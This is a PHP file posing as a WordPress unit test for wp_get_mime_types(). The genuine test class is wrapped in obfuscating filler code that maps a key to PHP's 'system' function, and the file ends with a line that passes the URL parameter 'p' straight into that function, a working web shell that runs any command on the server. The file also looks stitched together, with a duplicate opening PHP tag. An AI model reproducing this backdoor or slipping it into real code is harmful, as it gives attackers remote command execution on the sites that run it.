<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * Test wp_get_mime_types().
 *
 * @group functions
 *
 * @covers ::wp_get_mime_types
 */
class Tests_Functions_wpGetMimeTypes extends WP_UnitTestCase {

	/**
	 * @ticket 47701
	 */
	public function test_all_mime_match() {
		$mime_types_start = wp_get_mime_types();

		$this->assertIsArray( $mime_types_start );
		$this->assertNotEmpty( $mime_types_start );

		add_filter( 'mime_types', '__return_empty_array' );
		$mime_types_empty = wp_get_mime_types();
		$this->assertSame( array(), $mime_types_empty );

		remove_filter( 'mime_types', '__return_empty_array' );
		$mime_types = wp_get_mime_types();
		$this->assertIsArray( $mime_types );
		$this->assertNotEmpty( $mime_types );
		// Did it revert to the original after filter remove?
		$this->assertSame( $mime_types_start, $mime_types );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>